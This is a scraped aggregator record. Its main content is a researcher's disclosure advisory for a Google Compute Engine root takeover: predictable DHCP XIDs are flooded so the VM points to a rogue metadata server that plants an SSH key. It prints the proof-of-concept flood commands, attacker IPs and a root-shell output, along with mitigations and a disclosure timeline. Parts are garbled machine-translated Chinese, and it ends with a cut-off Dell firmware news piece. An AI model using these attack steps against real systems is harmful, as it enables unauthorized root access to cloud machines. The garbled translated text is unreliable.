[301]\uff1a35.209.180.239\u7684Dhcpack\u4ece3.136.97.24444444444444444444444\uff1aMetadata Dhclient [301]\uff1a\u7ed1\u5b9a\u523035.209.180.239  - \u57285\u79d2\u5185\u7eed\u7ea6\u3002\n  root @ test-instance-2\uff1a\u301c\uff03cat /etc/hosts127.0.0.1 localhost :: 1 localhost ip6-localhost ip6-loopbackff02 :: 1 ip6-allnodesff02 :: 2 ip6-allrouters35.209.180.239\u5143\u6570\u636e.gooll\u3002 Google169.254.169.254\u6dfb\u52a0\u7684\u5185\u90e8\u5143\u6570\u636e\uff03169.254 Metadata.Google.Internal\uff03\u6dfb\u52a0\u5230Google\n \u8fd8\u6709\u6765\u81eaOsconfig\u4ee3\u7406\u7684\u4e00\u4e9b\u8054\u7cfb\uff08\u8bbf\u5ba2\u4ee3\u7406\u7684\u4fdd\u7559\u548c\u6d3b\u529b\u8fde\u63a5\u53ef\u80fd\u5e78\u5b58\u4e8e\u7f51\u7edc\u53d8\u5316\uff09\n  \u5f53\u6211\u91cd\u590d\u8fd9\u6b21\u653b\u51fb\u65f6\uff08\u4ecd\u7136\u662f2\u5206\u949f\u7684Xid\u7a97\u53e3\uff09\uff0c\u7b2c\u4e94\u8f6e\u6210\u529f\uff08\u5e38\u89c4\u79df\u7ea62.5\u5c0f\u65f6\uff09\u3002 \n\u7ed3\u8bba\u653b\u51fb\uff032\u548c\uff033\uff1a\u4e0d\u662f\u5730\u7403\u4e0a\u6700\u53ef\u9760\u7684\u4e1c\u897f\uff0c\u4f46\u7edd\u5bf9\u53ef\u80fd\u3002\u6211\u8ba4\u4e3a\u5982\u679c\u6211\u5c06\u53d7\u5bb3\u8005\u4e3b\u673a\u5411\u4e0b\u63d2\u5165Google_guest_agent\u7684TCP\u8bfb\u53d6\u8d85\u65f6\uff0c\u90a3\u4e48\u73b0\u6709\u7684\u5143\u6570\u636e\u670d\u52a1\u5668\u8fde\u63a5\u5c06\u88ab\u4e2d\u65ad\uff0c\u7136\u540e\u5728\u6062\u590d\u7f51\u7edc\u8fde\u63a5\u540e\u91cd\u65b0\u5b89\u88c5\u8fde\u63a5\uff0c\u5b83\u5c06\u8fbe\u5230\u5047\u5143\u6570\u636e\u670d\u52a1\u5668\u3002\n  \u4e0eISC\u53d6\u5f97\u8054\u7cfb\u3002\u4ed6\u4eec\u771f\u7684\u9700\u8981\u6539\u8fdbSRANDOM\u8bbe\u7f6e\u3002\u4e5f\u8bb8\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u529f\u80fd\uff0c\u6dfb\u52a0\u4e86\u5220\u9664\u6570\u636e\u5305ByNon-\u5408\u6cd5\u7684DHCP\u670d\u52a1\u5668\uff08\u56e0\u6b64\u60a8\u53ef\u4ee5\u4f9d\u8d56\u4e8e\u6b64\u4f5c\u4e3a\u989d\u5916\u7684\u5b89\u5168\u63aa\u65bd\uff09\u3002\n \u5373\u4f7fISC\u6539\u8fdb\u4e86\u4ed6\u4eec\u7684\u8f6f\u4ef6\uff0c\u5b83\u4e5f\u4f1a\u5728\u5927\u591a\u6570VM\u4e0a\u5347\u7ea7\u5e76\u5347\u7ea7\u3002\u5206\u6790\u60a8\u7684\u9632\u706b\u5899\u65e5\u5fd7\u4ee5\u5b66\u4e60\uff0c\u60a8\u6709\u4efb\u4f55\u5ba2\u6237\u7aef\u4f9d\u8d56\u4e8e\u8fd9\u4e9b\u7aef\u53e3\u7684\u4efb\u4f55\u53ef\u7528\u4e8e\u4efb\u4f55\u5408\u6cd5\u539f\u56e0\u7684\u5ba2\u6237\u7aef.Block UDP / 68\u5728VM\u4e4b\u95f4\uff0c\u56e0\u6b64\u53ea\u6709\u5143\u6570\u636e\u670d\u52a1\u5668\u53ef\u4ee5\u6267\u884cDHCP\u3002\n \u901a\u8fc7\u6b64\u865a\u62df\u4e3b\u673a\u540d\uff08MetAdata.Google.Internal\uff09\u505c\u6b62\u4f7f\u7528\u5143\u6570\u636e\u670d\u52a1\u5668\u3002\u81f3\u5c11\u5728\u4f60\u7684\u5b98\u65b9\u4ee3\u7406\u5546\u4e2d\u3002\n \u901a\u8fc7DHCP\u505c\u6b62\u7ba1\u7406\u865a\u62df\u4e3b\u673a\u540d\uff08Metadata.Google.Internal\uff09\u3002\u65e0\u8bba\u5982\u4f55\uff0cIP\u5730\u5740\u88ab\u8bb0\u5f55\u4e3a\u7a33\u5b9a\u3002\n \u81f3\u5c11\u5728\u5b98\u65b9\u4ee3\u7406\u5546\u4e2d\u4f7f\u7528TLS\u6765\u4fdd\u62a4\u4e0e\u5143\u6570\u636e\u670d\u52a1\u5668\u7684\u901a\u4fe1\u3002\n \u6ce8\u610f\uff0c\u4f7f\u7528\u968f\u673a\u751f\u6210\u7684MAC\u5730\u5740WOWN\uff06\uff0339; t\u9632\u6b62\u5728\u540c\u4e00\u5b50\u7f51\u4e0a\u5b89\u88c5\u653b\u51fb\u3002 \n\u6211\u53ea\u68c0\u67e5\u4e86\u4e3b\u8981\u7684\u4e3b\u9898\uff0c\u7531\u4e8e\u53e6\u4e00\u4e2a\u56e0\u7d20\uff0c\u5b83\u4eec\u4e0d\u4f1a\u53d7\u5230\u5f71\u54cd\uff08\u81f3\u5c11\u5728\u68c0\u67e5\u65f6\uff09\uff08\u4f8b\u5982\uff0c\u4e0d\u9ed8\u8ba4\u4f7f\u7528DHCP\uff09\u3002\n  Google\u901a\u5e38\u5173\u95ed\u5e26\u6709\u72b6\u6001\uff06\uff0334\u7684\u9519\u8bef\u62a5\u544a;\u4e0d\u53ef\u884c\u7684\uff06\uff0334;\u5f53\u9700\u8981\u4fee\u590d\u98ce\u9669\u6240\u9700\u7684\u52aa\u529b\u3002\u8fd9\u4e0d\u662f\u8fd9\u79cd\u60c5\u51b5\u3002\u6211\u8ba4\u4e3a\u80cc\u666f\u4e2d\u6709\u4e00\u4e9b\u6280\u672f\u590d\u6742\u6027\uff0c\u5b83\u4e0d\u4f1a\u8f7b\u677e\u5730\u90e8\u7f72\u7f51\u7edc\u7ea7\u4fdd\u62a4\u91cf\u5ea6\u7684\uff06\uff0339; t allowthem .until\u56fa\u5b9a\u5230\u8fbe\uff0cDon\uff06\uff0339; t\u4f7f\u7528dhcp\u6216\u8bbe\u7f6e\u4e3b\u673a\u7ea7\u9632\u706b\u5899\u89c4\u5219\uff0c\u4ee5\u786e\u4fddDHCP\u901a\u4fe1Metadata Server\uff08169.254.169.254\uff09\u662f\u3002\n  2020-09-26\uff1a\u95ee\u9898\u5df2\u8bc6\u522b\uff0c\u653b\u51fb\uff031\u9a8c\u8bc1\u4e862012-09-27\uff1a\u62a5\u544a\u7ed9Google VRP2020-09-29\uff1aVRP\u5206\u7c7b\u5b8c\u6210\uff06\uff0334;\u8c03\u67e5\u5b83\uff06\uff0334; 2020-10-02\uff1a\u8fdb\u4e00\u6b65\u7684\u8be6\u7ec6\u4fe1\u606f\u5171\u4eab\u5173\u4e8e\u653b\u51fb\uff032\u548c\uff0332020-10-07\uff1a\u63a5\u53d7\uff0c\uff06\uff0334;\u6f02\u4eae\u7684Catch\uff06\uff0334; 2020-12-02\uff1a\u5173\u4e8e\u4f30\u8ba1\u4f30\u8ba1\u7684\u65f6\u95f4\u7684\u4f30\u8ba1\u65f6\u95f4\uff1a...\uff06\uff0334;\u5047\u671f\u5b63\u8282\u5373\u5c06\u5230\u6765\uff06\uff0334; 2021-06-07\uff1a\u95ee\u8c37\u6b4c\u5982\u679c\u4fee\u590d\u662f\u5408\u7406\u7684\u65f6\u95f4\uff0c\u5c31\u50cf\u6211\uff06\uff0339; m\u8ba1\u5212\u53d1\u5e03adject2021-06-08\uff1a\u6807\u51c6\u54cd\u5e94\uff06\uff0334;\u6211\u4eec\u8981\u6c42\u4e00\u4e2a\u5408\u7406\u7684\u63d0\u524d\u901a\u77e5\u3002\uff06\uff0334; 2021-06-25\uff1a\u516c\u5f00\u62ab\u9732 ", "note_en": "This is an advisory about an unpatched vulnerability (at time of publishing this repo, 2021-06-25) affectingvirtual machines in Google&#39;s Compute Engine platform.The technical details below is almost exactly the same as my report sent to the VRP team.\n Attackers could take over virtual machines of the Google Cloud Platform over the network due to weakrandom numbers used by the ISC DHCP software and an unfortunate combination of additional factors.This is done by impersonating the Metadata server from the targeted virtual machine&#39;s point of view.By mounting this exploit, the attacker can grant access to themselves over SSH (public key authentication)so then they can login as the root user.\n  ISC&#39;s implementation of the DHCP client (isc-dhcp-client package on the Debian flavors) relies onrandom(3) to generate pseudo-random numbers (a nonlinear additive feedback random).It is  seeded with the srandom function as follows:\n /* Make up a seed for the random number generator from current\t time plus the sum of the last four bytes of each\t interface&#39;s hardware address interpreted as an integer.\t Not much entropy, but we&#39;re booting, so we&#39;re not likely to\t find anything better. */\tseed = 0;\tfor (ip = interfaces; ip; ip = ip-&gt;next) {\t\tint junk;\t\tmemcpy(&amp;junk,\t\t &amp;ip-&gt;hw_address.hbuf[ip-&gt;hw_address.hlen -\t\t\t\t\t sizeof seed], sizeof seed);\t\tseed += junk;\t}\tsrandom(seed + cur_time + (unsigned)getpid());\n  the sum of the last 4 bytes of the ethernet addresses (MAC) of the network interface cards\n On the Google Cloud Platform, the virtual machines usually have only 1 NIC, something like this:\n root@test-instance-1:~/isc-dhcp-client/real3# ifconfigens4: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1460 inet 10.128.0.2 netmask 255.255.255.255 broadcast 10.128.0.2 inet6 fe80::4001:aff:fe80:2 prefixlen 64 scopeid 0x20&lt;link&gt; ether 42:01:0a:80:00:02 txqueuelen 1000 (Ethernet) RX packets 1336873 bytes 128485980 (122.5 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 5708403 bytes 2012678044 (1.8 GiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\n Note that the last 4 bytes ( 0a:80:00:02) of the MAC address ( 42:01:0a:80:00:02) are actually the same asthe internal IP address of the box ( 10.128.0.2). This means, 1 of the 3 components is effectively public.\n The pid of the dhclient process is predictable. The linux kernel assigns process IDs in a linear way.I found that the pid varies between 290 and 315 (by rebooting a Debian 10 based VM many times andchecking the pid), making this component of the seed easily predictable.\n The unix time component has a more broad domain, but this turns out to be not a practical problem (see later).\n The firewall/router of GCP blocks broadcast packets sent by VMs, so only the metadata server (169.254.169.254)receives them. However, some phases of the DHCP protocol don&#39;t rely on broadcasts, and the packets to be sentcan be easily calculated and sent in advance.\n To mount this attack, the attacker needs to craft multiple DHCP packets using a set of precalculated/suspectedXIDs and flood the victim&#39;s dhclient directly (no broadcasts here). If the XID is correct, the victim machine appliesthe network configuration. This is a race condition, but since the flood is fast and exhaustive, the metadata serverhas no real chance to win.\n At this point the attacker is in the position of reconfiguring the network stack of the victim.\n Google heavily relies on the Metadata server, including the distribution of ssh public keys.The connection is secured at the network/routing layer and the server is not authenticated (no TLS, clearhttp only). The  google_guest_agent process, that is responsible for processing the responses of theMetadata server, establishes the connection via the virtual hostname  metadata.google.internal whichis an alias in the  /etc/hosts file. This file is managed by  /etc/dhcp/dhclient-exit-hooks.d/google_set_hostnameas a hook part of the DHCP response processing and the alias is normally added by this script at eachDHCPACK.By having full control over DHCP, the Metadata server can be impersonated. This attack has been found anddocumented by  Chris Moberly, who inspired my research with his oslogin privesc write up here:\n  The difference is, flooding of the dhclient process is done remotely in my attack and the XIDs are guessed.\n  #1 Instructing the client to set the IP address of the rogue metadata server on the NIC.No router is configured. This effectively cuts the internet connection of the box. google_guest_agent can&#39;t fall back to connecting the real metadata server.This DHCP lease is short lived (15 seconds), so dhclient sends a DHCPREQUEST soon again and starts lookingfor a new DHCPACK.\n Since a new ip address (the rouge metadata server) and new hostname ( metadata.google.com) is part of thisDHCPACK packet, the  google_set_hostname function adds two lines like like below (35.209.180.239 is the rougemetadata server I used):\n  The attacker is still flooding at this point, and since ARP is not flushed quickly, these packets arestill delivered.\n #2. Restoring a working network stack, along with the valid router address. This DHCPACK does not contain a hostname,so  google_set_hostname won&#39;t touch  /etc/hosts. The poisoned  metadata.google.internal entry remains in there.\n In case multiple entries are present in the hosts file, the Linux kernel prioritizes the link-local address(169.254.169.254) lower than the routable ones.\n At this point  google_guest_agent can establish a TCP connection to the (rouge) metadata server, where it getsa config that contains the attacker&#39;s ssh public key. The entry is populated into  /root/.ssh/authorized_keysand the attacker can open a root shell remotely.\n  Attackers would gain full access to the targeted virtual machines in all attack scenarios below.\n Attack #1: Targeting a VM on the same subnet (~same project), while it is rebooting.The attacker needs presence on another host.\n Attack #2: Targeting a VM on the same subnet (~same project), while it is refreshing the lease (so no reboot is needed).This takes place every half an hour (1800s), making 48 windows/attempts possible a day.Since an F class VM has ~170.000 pps (packet per second), and a day of unixtime + potential pids makes ~86420 potentialXIDs, this is a feasible attack vector.\n Attack #3: Targeting a VM over the internet. This requires the firewall in front of the victim VM to be fully open.Probably not a common scenario, but since even the webui of GCP Cloud Console has an option for that, there must bequite some VMs with this configuration.In this case the attacker also needs to guess the internal IP address of the VM, but since the first VM seemsto get  10.128.0.2 always, the attack could work, still.\n   As described above, you need to run a rogue metadata server running a host with port 80 open from the internet.I used 35.209.180.239 for this purpose (this is the public IP address of 10.128.0.2, a compute engine box actually),meta.py is running here:\n  My proof of concept exploits a simplified setup, when the victim box is being rebooted. In this case unixtimeof the dhclient process can be guessed easily.\n  The victim box is  10.128.0.4 here. The public IP address of this host is  34.67.219.89.Verifying first we don&#39;t have access using the RSA private key that belongs to id_rsa.pub referenced abovefor meta.py:\n    Then I type reboot on the victim host ( 10.128.0.4). The rest of the output of  takeover-at-reboot.pl:\n 10.128.0.4 seems to be not alive anymore\tRUN: ip addr show dev ens4 | awk &#39;/inet / {print $2}&#39; | cut -d/ -f1\tRUN: ip route show default | awk &#39;/via/ {print $3}&#39;\tNIC: ens4\tMin pid: 290\tMax pid: 315\tMin ts: 1601231808\tMax ts: 1601231823\tMy IP: 10.128.0.2\tRouter: 10.128.0.1\tTarget IP: 10.128.0.4\tTarget MAC: 42:01:0a:80:00:04\tNumber of potential xids: 41\tInitial OFFER+ACK flood\tMAC: 42:01:0a:80:00:04\tSrc IP: 10.128.0.2\tDst IP: 10.128.0.4\tNew IP: 35.209.180.239\tNew hostname: metadata.google.internal\tNew route:\tACK: true\tOffer: true\tOneshot: false\tFlooding again to revert the original network config\tMAC: 42:01:0a:80:00:04\tSrc IP: 10.128.0.2\tDst IP: 10.128.0.4\tNew IP: 10.128.0.4\tNew hostname:\tNew route: 10.128.0.1\tACK: true\tOffer: false\tOneshot: false\n After this point, the output of the screen where meta.py is running is flooded with lines like this:\n  At this point, I can login to victim box using the new (attacker controlled) SSH key.\n root@builder:/opt/_tmp/dhcp/exploit# ssh -i id_rsa root@34.67.219.89\tLinux metadata 4.19.0-11-cloud-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64\tThe programs included with the Debian GNU/Linux system are free software;\tthe exact distribution terms for each program are described in the\tindividual files in /usr/share/doc/*/copyright.\tDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\tpermitted by applicable law.\troot@metadata:~# id\tuid=0(root) gid=0(root) groups=0(root),1000(google-sudoers)\n   To verify this setup, I built a slightly modified version of dhclient; besides some additional log lines the only important change is theincreased frequency of lease renewals:\n *** dhclient.c.orig 2020-09-29 23:38:16.322296529 +0200--- dhclient.c 2020-09-29 22:51:11.000000000 +0200*************** void bind_lease (client)*** 1573,1578 ****--- 1573,1580 ---- client-&gt;new = NULL; /* Set up a timeout to start the renewal process. */+ client-&gt;active-&gt;renewal = cur_time + 5; // hack!+ tv.tv_sec = client-&gt;active-&gt;renewal; tv.tv_usec = ((client-&gt;active-&gt;renewal - cur_tv.tv_sec) &gt; 1) ? myrandom(&#34;active renewal&#34;) % 1000000 : cur_tv.tv_usec;\n A 10 minute window consists of ~600 potetial XIDs. I rebooted the victim host ( 10.128.0.4), logged in, ran journalctl -f|grep dhclient to see what is going on. Then I executed the  takeover-at-renew.pl scripton the attacker machine (internal ip:  10.128.0.2, external ip:  35.209.180.239, a VM on the same subnet):\n   Oct 02 07:06:05 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:05 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254Oct 02 07:06:05 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.Oct 02 07:06:10 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:10 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254Oct 02 07:06:11 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.Oct 02 07:06:16 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:16 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254Oct 02 07:06:16 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.Oct 02 07:06:21 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:21 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254Oct 02 07:06:21 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.Oct 02 07:06:26 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:26 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254Oct 02 07:06:26 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.Oct 02 07:06:31 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:31 test-instance-2 dhclient[301]: DHCPACK of 35.209.180.239 from 10.128.0.2Oct 02 07:06:32 metadata dhclient[301]: bound to 35.209.180.239 -- renewal in 5 seconds.Oct 02 07:06:37 metadata dhclient[301]: DHCPREQUEST for 35.209.180.239 on ens4 to 35.209.180.239 port 67Oct 02 07:06:44 metadata dhclient[301]: DHCPREQUEST for 35.209.180.239 on ens4 to 35.209.180.239 port 67Oct 02 07:06:46 metadata dhclient[301]: DHCPACK of 10.128.0.4 from 10.128.0.2Oct 02 07:06:47 metadata dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.\n This means the 6th round was successful. With &#34;normal&#34; lease renewal (unpatched  dhclient), the same thing would havetaken ~3 hours.\n  root@test-instance-2:~# cat /etc/hosts127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters35.209.180.239 metadata.google.internal metadata # Added by Google169.254.169.254 metadata.google.internal # Added by Google\n I repeated the attack and flooded the victim with 3 hours of XIDs (~10000). The 51th DHCPREQUEST was hijacked (wouldhave taken a little bit more than a complete day with &#34;normal&#34; lease times).I concluded that the execution time indeed correlates with the number of XIDs.This of course would decrease the success rate in real life setups, but the attack is still feasible.\n   I found that my DHCP related packets were not forwarded to the VM while the VM is rebooting (probably not after thelease is returned at reboot), effectively ruling out  takeover-at-discover.pl.\n I decided to carry out an attack against the lease renewal (effectively the same as #2). My expectation was that it shouldstill be feasible.\n I tested this scenario using an AWS VM as the attacker machine and a really short time window (2 minutes).The  meta.py script was still running on the GCP attacker machine (external ip: 35.209.180.239).I rebooted the victim machine (internal ip:  10.128.0.4, external ip:  34.122.27.253), logged in, ran  journalctl -f|grep dhclient.\n  root@ip-172-31-25-197:~/real8# NIC=eth0 ONESHOT_WINDOW_MIN=2 FINAL_IP=10.128.0.4 MY_ROUTER=10.128.0.1 ./takeover-at-renew.pl 34.122.27.253 35.209.180.239Flooding destination between with XIDs between 1601651865 and 1601651984RUN: ip addr show dev eth0 | awk &#39;/inet / {print $2}&#39; | cut -d/ -f1RUN: /root/real8/randr 10.128.0.4 290 315 1601651865 1601651984 2&gt;/dev/null | paste -sd &#39;,&#39; - &gt;/tmp/xids.txtNIC: eth0Min pid: 290Max pid: 315Min ts: 1601651865Max ts: 1601651984Attacker IP: 172.31.25.197Router: 10.128.0.1Target IP (initial phase): 34.122.27.253Target MAC: 42:01:0a:80:00:04Target IP (final phase): 10.128.0.434.122.27.253 is aliveStart flooding the victim for 1801 secAnd monitoring it in the backgroundRunning for 1801 sec in the background: /root/real8/flood -ack -lease 15 -dev eth0 -dstip 34.122.27.253 -newhost metadata.google.internal -newip 35.209.180.239 -srcip 172.31.25.197 -mac 42:01:0a:80:00:04 -xidfile /tmp/xids.txtMAC: 42:01:0a:80:00:04Src IP: 172.31.25.197Dst IP: 34.122.27.253New IP: 35.209.180.239New hostname: metadata.google.internalNew route:ACK: trueOffer: falseOneshot: falseNumber of XIDs: 145The host is down, it probably swallowed the poison ivy!And now some flood again to revert connectivityit seems the attack was successfulroot@ip-172-31-25-197:~/real8# Running for 12 sec in the background: /root/real8/flood -ack -ack -lease 1800 -dev eth0 -dstip 34.122.27.253 -newip 10.128.0.4 -route 10.128.0.1 -srcip 172.31.25.197 -mac 42:01:0a:80:00:04 -xidfile /tmp/xids.txtMAC: 42:01:0a:80:00:04Src IP: 172.31.25.197Dst IP: 34.122.27.253New IP: 10.128.0.4New hostname:New route: 10.128.0.1ACK: trueOffer: falseOneshot: falseNumber of XIDs: 145\n This was running for a while and finally succeeded at the 21th DHCPREQUEST. With normal lease times this would have taken ~11 hours.The metadata server was taken over successfully:\n Oct 02 15:21:30 test-instance-2 dhclient[301]: DHCPACK of 35.209.180.239 from 3.136.97.244Oct 02 15:21:30 metadata dhclient[301]: bound to 35.209.180.239 -- renewal in 5 seconds.\n  root@test-instance-2:~# cat /etc/hosts127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters35.209.180.239 metadata.google.internal metadata # Added by Google169.254.169.254 metadata.google.internal # Added by Google\n And also got some connections from the osconfig agent (the kept-alive connection of the guest agent probably survived the network change)\n  When I repeated this attack (2 minute XID window still), the 5th round was successful (2.5 hours with normal leases).\n Conclusion about attack #2 and #3: not the most reliable thing on earth, but definetely possible. I think if I kept the victim host downlonger than the TCP read timeout of google_guest_agent, then the existing metadata server connection would be interrupted, thenwhile reinitiating the connection after the network connectivity was restored, it would hit the fake metadata server.\n  Get in touch with ISC. They really need to improve the srandom setup. Maybe get a new feature added that drops packets bynon-legitimate DHCP servers (so you could rely on this as an additional security measure).\n Even if ISC has improved their software, it won&#39;t be upgraded on most of your VMs. Analyze your firewall logs to learnif you have any clients that rely on these ports for any legitimate reasons.Block udp/68 between VMs, so that only the metadata server could could carry out DHCP.\n Stop using the Metadata server via this virtual hostname (metadata.google.internal). At least in your official agents.\n Stop managing the virtual hostname (metadata.google.internal) via DHCP. The IP address is documented to be stable anyway.\n Secure the communication with the Metadata server by using TLS, at least in your official agents.\n Note, using a random generated MAC address wouldn&#39;t prevent mounting the attack on the same subnet.\n   I checked only the major ones, they were not affected (at least at the time of checking) due to another factors(e.g. not using DHCP by default).\n  Google usually closes bug reports with status &#34;Unfeasible&#34; when the efforts required to fix outweigh the risk.This is not the case here. I think there is some technical complexity in the background, which doesn&#39;t allowthem deploying a network level protection measure easily.Until the fix arrives, don&#39;t use DHCP or setup a host level firewall rule to ensure the DHCP communication comesfrom the metadata server (169.254.169.254).\n  2020-09-26: Issue identified, attack #1 validated2020-09-27: Reported to Google VRP2020-09-29: VRP triage is complete &#34;looking into it&#34;2020-10-02: Further details shared about attack #2 and #32020-10-07: Accepted, &#34;Nice catch&#34;2020-12-02: Update requested about the estimated time of fix2020-12-03: ... &#34;holiday season coming up&#34;2021-06-07: Asked Google if a fix is coming in a reasonable time, as I&#39;m planning to publish an advisory2021-06-08: Standard response &#34;we ask for a reasonable advance notice.&#34;2021-06-25: Public disclosure", "posttime": "2021-06-29 22:24:34", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "google,compute,dhcp", "title": "Google Compute\u5f15\u64ce\uff08GCE\uff09VM\u201c\u8fdc\u7a0b\u201d\u6839\u6e90\u901a\u8fc7DHCP\u6cdb\u6ee5 ", "title_en": "Google Compute Engine (GCE) VM \u201cremote\u201d root exploit via DHCP flood", "transed": 1, "url": "https://github.com/irsl/gcp-dhcp-takeover-code-exec", "via": "", "real_tags": ["google", "compute", "dhcp"]}, {"category": "", "categoryclass": "", "imagename": "d7a221699a361b32f062e280c50f8cb4.jpg", "infoid": 1068416, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u7814\u7a76\u4eba\u5458\u591a\u5e74\u6765\u6d89\u53ca\u5177\u6709\u79f0\u4e3a\u56fa\u4ef6\u7684\u57fa\u7840\u8ba1\u7b97\u673a\u4ee3\u7801\u7684\u5b89\u5168\u95ee\u9898\u3002\u5b83\u5e38\u5e38\u7528\u6f0f\u6d1e\uff0c\u5b83\u96be\u4ee5\u4f7f\u7528\u8865\u4e01\u66f4\u65b0\uff0c\u800c\u4e14\u8d8a\u6765\u8d8a\u591a\u5730\u5229\u7528\u6f0f\u6d1e\uff0c\u8d8a\u6765\u8d8a\u591a\u5730\u66f4\u65b0\u771f\u5b9e\u4e16\u754c\u7684\u653b\u51fb\u76ee\u6807\u3002\u73b0\u5728\uff0c\u4e00\u4e2a\u5584\u610f\u7684\u673a\u5236\u53ef\u4ee5\u8f7b\u677e\u66f4\u65b0\u6234\u5c14\u8ba1\u7b97\u673a\u7684\u56fa\u4ef6\u672c\u8eab\u5c31\u662f\u56db\u4e2a\u57fa\u672c\u9519\u8bef\u7684\u7ed3\u679c\u6613\u53d7\u653b\u51fb\u3002\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u4ee5\u83b7\u5f97\u5bf9\u76ee\u6807\u8bbe\u5907\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\u3002\n \u5b89\u5168\u516c\u53f8Eclypsium\u7684\u7814\u7a76\u4eba\u5458\u7684\u65b0\u53d1\u73b0\u4f1a\u5f71\u54cd128\u4e2a\u6234\u5c14\u8ba1\u7b97\u673a\u578b\u53f7\uff0c\u5305\u62ec\u53f0\u5f0f\u673a\uff0c\u7b14\u8bb0\u672c\u7535\u8111\u548c\u5e73\u677f\u7535\u8111\u3002\u7814\u7a76\u4eba\u5458\u4f30\u8ba1\uff0c\u6f0f\u6d1e\u603b\u5171\u63ed\u793a\u4e863000\u4e07\u4e2a\u8bbe\u5907\uff0c\u5e76\u4e14\u5229\u7528\u751a\u81f3\u5728\u5305\u542bMicrosoft\uff06\uff0339; S\u5b89\u5168\u6838\u5fc3PC\u4fdd\u62a4\u7684\u6a21\u578b\u4e2d\u5de5\u4f5c - \u4e13\u95e8\u6784\u5efa\u7684\u7cfb\u7edf\uff0c\u4ee5\u51cf\u5c11\u56fa\u4ef6\u6f0f\u6d1e\u3002\u6234\u5c14\u4eca\u5929\u6b63\u5728\u4e3a\u7f3a\u9677\u91ca\u653e\u6591\u5757\u3002\n \u201c\u8fd9\u4e9b\u6f0f\u6d1e\u6b63\u5728\u6613\u4e8e\u5229\u7528\u6a21\u5f0f\u3002\u5b83\u57fa\u672c\u4e0a\u5c31\u50cf\u56de\u5230\u65f6\u95f4 - \u5b83\u51e0\u4e4e\u5c31\u50cf'90\u5e74\u4ee3\uff0c\u201cEclypsium\u7684\u4e3b\u8981\u5206\u6790\u5e08Jesse Michael\u8bf4\u3002 \u201c\u8be5\u884c\u4e1a\u5df2\u7ecf\u53d6\u5f97\u4e86\u5e94\u7528\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u4ee3\u7801\u4e2d\u7684\u6240\u6709\u8fd9\u4e9b\u5b89\u5168\u529f\u80fd\u7684\u6210\u719f\uff0c\u4f46\u5b83\u4eec\uff06\uff0339;\u91cd\u65b0\u5728\u65b0\u7684\u56fa\u4ef6\u5b89\u5168\u529f\u80fd\u4e2d\u5173\u6ce8\u6700\u4f73\u5b9e\u8df5\u3002\u201d\n \u6f0f\u6d1e\u663e\u793a\u5728\u540d\u4e3aBiosconnect\u7684Dell\u529f\u80fd\u4e2d\uff0c\u5141\u8bb8\u7528\u6237\u8f7b\u677e\uff0c\u751a\u81f3\u81ea\u52a8\u4e0b\u8f7d\u56fa\u4ef6\u66f4\u65b0\u3002 Biosconnect\u662f\u66f4\u5e7f\u6cdb\u7684Dell\u66f4\u65b0\u548c\u8fdc\u7a0b\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u529f\u80fd\u7684\u4e00\u90e8\u5206\uff0c\u79f0\u4e3aSupportAssist\uff0c\u5176\u5177\u6709\u6f5c\u5728\u95ee\u9898\u7684\u6f0f\u6d1e\u7684\u81ea\u8eab\u4efd\u989d\u3002\u66f4\u65b0\u673a\u5236\u662f\u653b\u51fb\u8005\u7684\u6709\u4ef7\u503c\u7684\u76ee\u6807\uff0c\u56e0\u4e3a\u5b83\u4eec\u53ef\u4ee5\u6c61\u67d3\u4ee5\u5206\u914d\u6076\u610f\u8f6f\u4ef6\u3002\n \u8fd9\u56db\u4e2a\u6f0f\u6d1e\u5728Biosconnect\u4e2d\u53d1\u73b0\u7684\u7814\u7a76\u4eba\u5458\uff06\uff0339; 